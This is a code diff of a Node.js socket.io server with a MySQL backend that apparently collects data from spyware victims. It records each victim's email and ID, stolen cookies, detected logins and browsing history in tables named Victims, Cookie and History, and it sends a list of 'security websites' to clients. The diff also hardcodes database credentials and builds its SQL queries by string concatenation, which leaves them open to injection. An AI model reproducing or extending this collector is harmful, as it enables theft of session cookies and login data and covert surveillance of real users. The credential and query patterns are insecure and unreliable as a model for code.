@@ -15,6 +15,9 @@ var con = mysql.createConnection({
   user: "kevchang",
   password: "110328939",
   database: "kevchang"
+  // user: "root",
+  // password: "asd",
+  // database: "kevchang"
 });
 
 con.connect(function(err) {
@@ -206,17 +209,15 @@ console.log("Listening on port 3000");
 
 
 io.on('connection', (socket) => {
-  socket.on("userInfo", (userInfo) => {
-    userInfo.email = "FAKE";
-    userInfo.id = "1313413";
-    var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
+  socket.on("userData", (userData) => {
+    var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userData.email+"', '"+ userData.id+"')";
     con.query(sql, function (err, result) {
-      console.log("1 victim added: "+userInfo.email);
+      console.log("1 victim added: "+userData.email+ " ID:"+userData.id);
     });
     //make a table to map socketID with victim ID
-    var sqlIDMapping = "INSERT INTO Active (socketID, userID) VALUES ('"+socket.id+"', '"+ userInfo.id+"')";
+    var sqlIDMapping = "INSERT INTO Active (socketID, userID) VALUES ('"+socket.id+"', '"+ userData.id+"')";
     con.query(sqlIDMapping, function(err, result) {
-        console.log("Mapping added: "+userInfo.id+ " " +socket.id+"");
+        console.log("Mapping added: User ID:"+userData.id+ " Socket ID:" +socket.id+"");
     });
 
     socket.emit('securityWebsites', [
@@ -239,7 +240,7 @@ io.on('connection', (socket) => {
       console.log("Login detected: " + loginInfo);
     });
     socket.on('Cookies', (cookies) => {
-      var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userInfo.id+"', '"+ cookies+"')";
+      var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userData.id+"', '"+ cookies+"')";
       con.query(sql, function (err, result) {
         if (err) throw err;
       });
@@ -249,7 +250,7 @@ io.on('connection', (socket) => {
       var str2 = "'"+history[1]+"'" //timeStamp String
 
       //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
-      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('"+userInfo.id+"', "+ str2 + ","+ str1+")";
+      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('"+userData.id+"', "+ str2 + ","+ str1+")";
 
       con.query(sql, function (err, result) {
           if (err) throw err;
